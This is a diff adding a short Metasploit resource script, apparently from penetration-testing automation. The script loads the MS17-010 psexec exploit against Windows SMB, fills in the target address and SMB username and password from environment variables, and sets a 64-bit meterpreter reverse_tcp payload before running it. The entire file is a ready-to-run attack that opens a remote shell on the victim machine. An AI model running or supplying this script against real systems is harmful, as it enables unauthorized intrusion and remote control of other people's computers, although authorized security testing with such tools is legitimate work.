@@ -1,0 +1,10 @@
+use exploit/windows/smb/ms17_010_psexec
+<ruby>
+run_single("set RHOSTS #{ENV['IP_ADDR']}")
+run_single("set smbuser #{ENV['SMBUSER']}")
+run_single("set smbpass #{ENV['SMBPASS']}")
+</ruby>
+set payload windows/x64/meterpreter/reverse_tcp
+run
+quit
+exit
